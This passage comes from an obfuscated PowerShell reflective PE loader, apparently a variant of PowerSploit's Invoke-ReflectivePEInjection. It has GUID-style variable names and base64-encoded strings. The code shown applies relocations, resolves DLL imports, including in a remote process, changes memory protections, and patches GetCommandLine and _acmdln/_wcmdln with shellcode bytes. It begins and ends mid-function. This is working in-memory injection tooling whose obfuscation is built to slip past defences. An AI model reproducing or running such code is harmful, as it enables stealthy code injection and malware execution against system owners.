			${806a7fd30e384d45935b8b1cab6b79f8} = (${445e2fbb1b844c4584498dd9a6f50596}.SizeOfBlock - $ImageBaseRelocSize) / 2
			for(${4c7705bd7e4a4adbb1ff54055067af60} = 0; ${4c7705bd7e4a4adbb1ff54055067af60} -lt ${806a7fd30e384d45935b8b1cab6b79f8}; ${4c7705bd7e4a4adbb1ff54055067af60}++)
			{
				${de94964c5cd5486099b761e0fb457470} = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]${2984238c43d440bd9a9c419de9179cc1}) ([Int64]$ImageBaseRelocSize + (2 * ${4c7705bd7e4a4adbb1ff54055067af60})))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${de94964c5cd5486099b761e0fb457470}, [Type][UInt16])
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]${fdfe2e444e0f43208d8c826c6d6d3a50} = $RelocationInfo -band 0xF000
				for (${22b6bd1fa3624dd8a84e860ca5030295} = 0; ${22b6bd1fa3624dd8a84e860ca5030295} -lt 12; ${22b6bd1fa3624dd8a84e860ca5030295}++)
				{
					${fdfe2e444e0f43208d8c826c6d6d3a50} = [Math]::Floor(${fdfe2e444e0f43208d8c826c6d6d3a50} / 2)
				}
				if ((${fdfe2e444e0f43208d8c826c6d6d3a50} -eq ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_REL_BASED_HIGHLOW) `
						-or (${fdfe2e444e0f43208d8c826c6d6d3a50} -eq ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
					if (${c1db0633b0de40bfa5ea42a80c98f2ae} -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) (${91b138c9599a4457b5b93a0ccde15822}))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) (${91b138c9599a4457b5b93a0ccde15822}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif (${fdfe2e444e0f43208d8c826c6d6d3a50} -ne ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: ${fdfe2e444e0f43208d8c826c6d6d3a50}, relocationinfo: $RelocationInfo"
				}
			}
			${2984238c43d440bd9a9c419de9179cc1} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${2984238c43d440bd9a9c419de9179cc1}) ([Int64]${445e2fbb1b844c4584498dd9a6f50596}.SizeOfBlock))
		}
	}
	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${c8edec2d3caf433f9746e28faa91f6ff},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${a36b17e7e2e643b69f9b9e1a2bd60bb9},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${c3c389d397344cdcb031960f029f7926},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${bf6addb5678a4306bbd927c2e94d4ede},
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${bc96a39c79d24a35b88ba52e143fe2a2}
		)
		${0d562d8a696e463abdc2da2b4cc9ed68} = $false
		if (${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle -ne ${c8edec2d3caf433f9746e28faa91f6ff}.EffectivePEHandle)
		{
			${0d562d8a696e463abdc2da2b4cc9ed68} = $true
		}
		if (${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${e0e216f388464cdca071e9287ee61cf1} = Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${72938473351447079f3b9317ad2c9cce} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${e0e216f388464cdca071e9287ee61cf1}, [Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_IMPORT_DESCRIPTOR)
				if (${72938473351447079f3b9317ad2c9cce}.Characteristics -eq 0 `
						-and ${72938473351447079f3b9317ad2c9cce}.FirstThunk -eq 0 `
						-and ${72938473351447079f3b9317ad2c9cce}.ForwarderChain -eq 0 `
						-and ${72938473351447079f3b9317ad2c9cce}.Name -eq 0 `
						-and ${72938473351447079f3b9317ad2c9cce}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
					break
				}
				${1a57a0bfef2a46c085d2380193e70907} = [IntPtr]::Zero
				${ea82af90d6994548958606af6a94d6be} = (Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) ([Int64]${72938473351447079f3b9317ad2c9cce}.Name))
				${4b48e9e7cba040e0bb53a7c8c26134db} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${ea82af90d6994548958606af6a94d6be})
				if (${0d562d8a696e463abdc2da2b4cc9ed68} -eq $true)
				{
					${1a57a0bfef2a46c085d2380193e70907} = Import-DllInRemoteProcess -bc96a39c79d24a35b88ba52e143fe2a2 ${bc96a39c79d24a35b88ba52e143fe2a2} -ea82af90d6994548958606af6a94d6be ${ea82af90d6994548958606af6a94d6be}
				}
				else
				{
					${1a57a0bfef2a46c085d2380193e70907} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.LoadLibrary.Invoke(${4b48e9e7cba040e0bb53a7c8c26134db})
				}
				if ((${1a57a0bfef2a46c085d2380193e70907} -eq $null) -or (${1a57a0bfef2a46c085d2380193e70907} -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: ${4b48e9e7cba040e0bb53a7c8c26134db}"
				}
				[IntPtr]${82de0fe5d6a14bfb8c4ad70d0965e997} = Add-SignedIntAsUnsigned (${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) (${72938473351447079f3b9317ad2c9cce}.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned (${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) (${72938473351447079f3b9317ad2c9cce}.Characteristics) 
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					${fa5dfa5441e443058eecc9d000948866} = ''
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						${fa5dfa5441e443058eecc9d000948866} = [Int64]$OriginalThunkRefVal -band 0xffff 
					}
					else
					{
						[IntPtr]${2a966bf97e144d19841656b12ee1b2ad} = Add-SignedIntAsUnsigned (${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) ($OriginalThunkRefVal)
						${2a966bf97e144d19841656b12ee1b2ad} = Add-SignedIntAsUnsigned ${2a966bf97e144d19841656b12ee1b2ad} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${fa5dfa5441e443058eecc9d000948866} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${2a966bf97e144d19841656b12ee1b2ad})
					}
					if (${0d562d8a696e463abdc2da2b4cc9ed68} -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -bc96a39c79d24a35b88ba52e143fe2a2 ${bc96a39c79d24a35b88ba52e143fe2a2} -c7282ff644f94f67bef33d3a1829650d ${1a57a0bfef2a46c085d2380193e70907} -ef958cd51d3144759d0cfc0a4b45bd60 ${fa5dfa5441e443058eecc9d000948866}
					}
					else
					{
						[IntPtr]$NewThunkRef = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke(${1a57a0bfef2a46c085d2380193e70907}, ${fa5dfa5441e443058eecc9d000948866})
					}
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: ${fa5dfa5441e443058eecc9d000948866}. Dll: ${4b48e9e7cba040e0bb53a7c8c26134db}"
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, ${82de0fe5d6a14bfb8c4ad70d0965e997}, $false)
					${82de0fe5d6a14bfb8c4ad70d0965e997} = Add-SignedIntAsUnsigned ([Int64]${82de0fe5d6a14bfb8c4ad70d0965e997}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}
				${e0e216f388464cdca071e9287ee61cf1} = Add-SignedIntAsUnsigned (${e0e216f388464cdca071e9287ee61cf1}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${df43099bb4ab4dac839b5607bee6fa5d}
		)
		${4ade77cc24de4555a187e6f3784a1296} = 0x0
		if ((${df43099bb4ab4dac839b5607bee6fa5d} -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${df43099bb4ab4dac839b5607bee6fa5d} -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${df43099bb4ab4dac839b5607bee6fa5d} -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${4ade77cc24de4555a187e6f3784a1296} = ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${4ade77cc24de4555a187e6f3784a1296} = ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${df43099bb4ab4dac839b5607bee6fa5d} -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${4ade77cc24de4555a187e6f3784a1296} = ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${4ade77cc24de4555a187e6f3784a1296} = ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${df43099bb4ab4dac839b5607bee6fa5d} -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${df43099bb4ab4dac839b5607bee6fa5d} -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${4ade77cc24de4555a187e6f3784a1296} = ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_READWRITE
				}
				else
				{
					${4ade77cc24de4555a187e6f3784a1296} = ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_READONLY
				}
			}
			else
			{
				if ((${df43099bb4ab4dac839b5607bee6fa5d} -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${4ade77cc24de4555a187e6f3784a1296} = ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_WRITECOPY
				}
				else
				{
					${4ade77cc24de4555a187e6f3784a1296} = ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_NOACCESS
				}
			}
		}
		if ((${df43099bb4ab4dac839b5607bee6fa5d} -band ${bf6addb5678a4306bbd927c2e94d4ede}.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${4ade77cc24de4555a187e6f3784a1296} = ${4ade77cc24de4555a187e6f3784a1296} -bor ${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_NOCACHE
		}
		return ${4ade77cc24de4555a187e6f3784a1296}
	}
	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${c8edec2d3caf433f9746e28faa91f6ff},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${a36b17e7e2e643b69f9b9e1a2bd60bb9},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${bf6addb5678a4306bbd927c2e94d4ede},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${c3c389d397344cdcb031960f029f7926}
		)
		for( ${4c7705bd7e4a4adbb1ff54055067af60} = 0; ${4c7705bd7e4a4adbb1ff54055067af60} -lt ${c8edec2d3caf433f9746e28faa91f6ff}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${4c7705bd7e4a4adbb1ff54055067af60}++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${c8edec2d3caf433f9746e28faa91f6ff}.SectionHeaderPtr) (${4c7705bd7e4a4adbb1ff54055067af60} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_SECTION_HEADER)))
			${f05bb6e0c3734019996f1e5db89ecc6d} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]${c3c389d397344cdcb031960f029f7926}.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned (${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) (${f05bb6e0c3734019996f1e5db89ecc6d}.VirtualAddress)
			[UInt32]$ProtectFlag = Get-VirtualProtectValue ${f05bb6e0c3734019996f1e5db89ecc6d}.Characteristics
			[UInt32]$SectionSize = ${f05bb6e0c3734019996f1e5db89ecc6d}.VirtualSize
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -e39dbe60176b48af8d74a8a90f28e95a $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -c8edec2d3caf433f9746e28faa91f6ff ${c8edec2d3caf433f9746e28faa91f6ff} -dfccdc8a8c7748d3bab1a84f860772a5 $SectionPtr -d8b42bb3072b496db413a4756f1fa94d $SectionSize | Out-Null
			${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if (${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
			}
		}
	}
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${c8edec2d3caf433f9746e28faa91f6ff},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${a36b17e7e2e643b69f9b9e1a2bd60bb9},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${bf6addb5678a4306bbd927c2e94d4ede},
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${b0b21c684f9b487ca3e735309f04af90},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${c234f2cf0d9b4e839141a97336592954}
		)
		${035260d1f3b54c20b4385b7173c9c09d} = @() 
		${acafad3a2a75412893cf40bcdc32329b} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		[IntPtr]${7e8c5e022873429894a5b4a7f0911dca} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		if (${7e8c5e022873429894a5b4a7f0911dca} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
		}
		[IntPtr]$KernelBaseHandle = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		${a9ac91503ad644cab6ead38a9c767e38} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${b0b21c684f9b487ca3e735309f04af90})
		${6d21fe4f2f98456388bf181a7346ff39} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${b0b21c684f9b487ca3e735309f04af90})
		[IntPtr]$GetCommandLineAAddr = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke($KernelBaseHandle, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
		[IntPtr]$GetCommandLineWAddr = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke($KernelBaseHandle, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		}
		[Byte[]]$Shellcode1 = @()
		if (${acafad3a2a75412893cf40bcdc32329b} -eq 8)
		{
			$Shellcode1 += 0x48	
		}
		$Shellcode1 += 0xb8
		[Byte[]]$Shellcode2 = @(0xc3)
		${2eb9cd199aa248a290dd98c60940f2a2} = $Shellcode1.Length + ${acafad3a2a75412893cf40bcdc32329b} + $Shellcode2.Length
		${7ebc4b36dfc44f57a358fcc223d12a85} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${2eb9cd199aa248a290dd98c60940f2a2})
		${8b3b03cbf5154c4a91555f40d4b5d34d} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${2eb9cd199aa248a290dd98c60940f2a2})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9}.memcpy.Invoke(${7ebc4b36dfc44f57a358fcc223d12a85}, $GetCommandLineAAddr, [UInt64]${2eb9cd199aa248a290dd98c60940f2a2}) | Out-Null
		${a36b17e7e2e643b69f9b9e1a2bd60bb9}.memcpy.Invoke(${8b3b03cbf5154c4a91555f40d4b5d34d}, $GetCommandLineWAddr, [UInt64]${2eb9cd199aa248a290dd98c60940f2a2}) | Out-Null
		${035260d1f3b54c20b4385b7173c9c09d} += ,($GetCommandLineAAddr, ${7ebc4b36dfc44f57a358fcc223d12a85}, ${2eb9cd199aa248a290dd98c60940f2a2})
		${035260d1f3b54c20b4385b7173c9c09d} += ,($GetCommandLineWAddr, ${8b3b03cbf5154c4a91555f40d4b5d34d}, ${2eb9cd199aa248a290dd98c60940f2a2})
		[UInt32]$OldProtectFlag = 0
		${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]${2eb9cd199aa248a290dd98c60940f2a2}, [UInt32](${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if (${aa485f490a6d4dbcb08ed9a0e7f41001} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${d602f57426c4476889333017196c2e32} = $GetCommandLineAAddr
		Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 $Shellcode1 -af6d51d057d949f4a6df10d4847caeef ${d602f57426c4476889333017196c2e32}
		${d602f57426c4476889333017196c2e32} = Add-SignedIntAsUnsigned ${d602f57426c4476889333017196c2e32} ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${6d21fe4f2f98456388bf181a7346ff39}, ${d602f57426c4476889333017196c2e32}, $false)
		${d602f57426c4476889333017196c2e32} = Add-SignedIntAsUnsigned ${d602f57426c4476889333017196c2e32} ${acafad3a2a75412893cf40bcdc32329b}
		Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 $Shellcode2 -af6d51d057d949f4a6df10d4847caeef ${d602f57426c4476889333017196c2e32}
		${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]${2eb9cd199aa248a290dd98c60940f2a2}, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		[UInt32]$OldProtectFlag = 0
		${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]${2eb9cd199aa248a290dd98c60940f2a2}, [UInt32](${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if (${aa485f490a6d4dbcb08ed9a0e7f41001} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${3a3c61dda0964bd2a13caaea844f38c4} = $GetCommandLineWAddr
		Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 $Shellcode1 -af6d51d057d949f4a6df10d4847caeef ${3a3c61dda0964bd2a13caaea844f38c4}
		${3a3c61dda0964bd2a13caaea844f38c4} = Add-SignedIntAsUnsigned ${3a3c61dda0964bd2a13caaea844f38c4} ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${a9ac91503ad644cab6ead38a9c767e38}, ${3a3c61dda0964bd2a13caaea844f38c4}, $false)
		${3a3c61dda0964bd2a13caaea844f38c4} = Add-SignedIntAsUnsigned ${3a3c61dda0964bd2a13caaea844f38c4} ${acafad3a2a75412893cf40bcdc32329b}
		Write-BytesToMemory -ec206491ad3f4128af1a77bc1c4928e7 $Shellcode2 -af6d51d057d949f4a6df10d4847caeef ${3a3c61dda0964bd2a13caaea844f38c4}
		${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]${2eb9cd199aa248a290dd98c60940f2a2}, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		${7825d4659d7c418199d6d8c167ed766a} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
			, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
		foreach ($Dll in ${7825d4659d7c418199d6d8c167ed766a})
		{
			[IntPtr]$DllHandle = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke($DllHandle, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
				[IntPtr]$ACmdLnAddr = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.GetProcAddress.Invoke($DllHandle, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
				}
				${9a2c5f2d857d4609be3e0341e0648b19} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${b0b21c684f9b487ca3e735309f04af90})
				${73e177f4b9024e9aa5d7ef43687efbca} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${b0b21c684f9b487ca3e735309f04af90})
				${60b809191dc142d489402a3c4720d9fa} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				${e29eb007a0c64238ad94f5e45b71f6f7} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				${14562f2959f04433b1fcced236327e5b} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${acafad3a2a75412893cf40bcdc32329b})
				${9d8573591202419594d492efbe3d4295} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${acafad3a2a75412893cf40bcdc32329b})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${60b809191dc142d489402a3c4720d9fa}, ${14562f2959f04433b1fcced236327e5b}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${e29eb007a0c64238ad94f5e45b71f6f7}, ${9d8573591202419594d492efbe3d4295}, $false)
				${035260d1f3b54c20b4385b7173c9c09d} += ,($ACmdLnAddr, ${14562f2959f04433b1fcced236327e5b}, ${acafad3a2a75412893cf40bcdc32329b})
				${035260d1f3b54c20b4385b7173c9c09d} += ,($WCmdLnAddr, ${9d8573591202419594d492efbe3d4295}, ${acafad3a2a75412893cf40bcdc32329b})
				${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]${acafad3a2a75412893cf40bcdc32329b}, [UInt32](${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if (${aa485f490a6d4dbcb08ed9a0e7f41001} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${9a2c5f2d857d4609be3e0341e0648b19}, $ACmdLnAddr, $false)
				${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]${acafad3a2a75412893cf40bcdc32329b}, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]${acafad3a2a75412893cf40bcdc32329b}, [UInt32](${bf6addb5678a4306bbd927c2e94d4ede}.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if (${aa485f490a6d4dbcb08ed9a0e7f41001} = $false)
				{
